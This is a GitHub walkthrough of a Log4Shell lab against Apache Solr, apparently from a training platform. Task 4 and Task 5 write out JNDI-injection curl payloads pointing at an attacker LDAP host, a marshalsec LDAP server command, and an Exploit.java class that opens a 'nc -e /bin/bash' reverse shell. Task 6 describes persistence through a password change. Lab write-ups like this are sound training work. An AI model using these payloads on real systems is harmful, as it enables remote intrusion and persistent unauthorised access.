# log4shell-rce-walkthrough
## What is Log4Shell?
Log4Shell is a critical vulnerability in Log4j that allows remote code execution.

Task 1:

Start the machine

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/c46a92d4d290e6609110819340b96546ae44038b/Screenshot%202026-03-20%20135139.png)
Task 2:

Perform the nmap service version detection scan to see the service running

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/059bb05fea85eb589c171382b645b63941f64079/Screenshot%202026-03-20%20112148.png)

From the result the answer will be apache solr

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/c3bd27ce9fb33d11b10b93311ccb2dadc656ab97/Screenshot%202026-03-20%20140826.png)

Task 3:

Visit http://MACHINE_IP:8983 and see the front page to find out log4j used

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1857219ebc47ef2a4bcf0ec4e996463dec8bbf8c/Screenshot%202026-03-20%20112830.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/914646309bf26f8f955b7692102a12c0b21ee6d8/Screenshot%202026-03-20%20112840.png)

The solr.log is the file that has significan info downloaded from the task file

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/bf697c932cc79b2f8643370c2bb00b5be59fc876/Screenshot%202026-03-20%20113056.png)

The URL endpoint is indicated in these repeated entries are

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/e38c9683d7c0da229d269b74b8fef98332c3f9e9/Screenshot%202026-03-20%20114610.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/5ed586ba5d6ad46ae8447b72de51b4a46f3f4ae8/Screenshot%202026-03-20%20114630.png)

By seeing those entries the user can modify this field below

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/c1e6c254c608abf6f30e9be65c81342aca066e38/Screenshot%202026-03-20%20114723.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/c1e6c254c608abf6f30e9be65c81342aca066e38/Screenshot%202026-03-20%20114747.png)

Task 4:

In this task we are going to prove that the target is vulnerable lets set the netcat listener to catch the reverse connection

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/82839fa0c28e936c547904f3c27eac14d75a6ebf/Screenshot%202026-03-20%20115317.png)

Then make a requset with the curl command curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/82839fa0c28e936c547904f3c27eac14d75a6ebf/Screenshot%202026-03-20%20115330.png)

After this you can receive the reverse connection but the in the reverse connection we cannot perform any commands 

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/82839fa0c28e936c547904f3c27eac14d75a6ebf/Screenshot%202026-03-20%20115447.png)

Task 5:

let's move into exploitation phase clone the repo using the link to setup the tool for this attak https://github.com/mbechler/marshalsec

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20122100.png)

Then run this command to complete the lab setup mvn clean package -DskipTests

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20122510.png)

Let's set the ldap server using this command java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20123139.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20123208.png)

Now copy the exploit below and replace the ip with your ip and save with name Exploit.java

public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

Then compile the Exploit.java using this command javac Exploit.java -source 8 -target 8

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20124104.png)

After compiling the java file you can see the Exploit.class file

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20124204.png)

Then host the python server on the directory and set the netcat listener to receive the reverse connection

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20124249.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20124426.png)

Atlast run this command to receive the reverse connection curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/1ee994b7eb036e2f17fe9036cfe859e7f279118f/Screenshot%202026-03-20%20124532.png)

Then go to the netcat listener tab you can see the connection received from the target

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/3e91d224c5c5ef5f8cdfcad61fb76ebf1a46d980/Screenshot%202026-03-20%20131244.png)

Task 6:

Let's set the persistence in the target by changing the password od the solr user to get remote ssh service

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/114c4d74c16904a16911c8b5f746c980bccf19f1/Screenshot%202026-03-20%20131335.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20132654.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20132559.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20132948.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20132959.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20133134.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20133302.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20133445.png)

![image](https://github.com/Mathivanan49/log4shell-rce-walkthrough/blob/fc840e4dfa8c7e22ff675d2faa0c29f3f265dc24/Screenshot%202026-03-20%20133508.png)












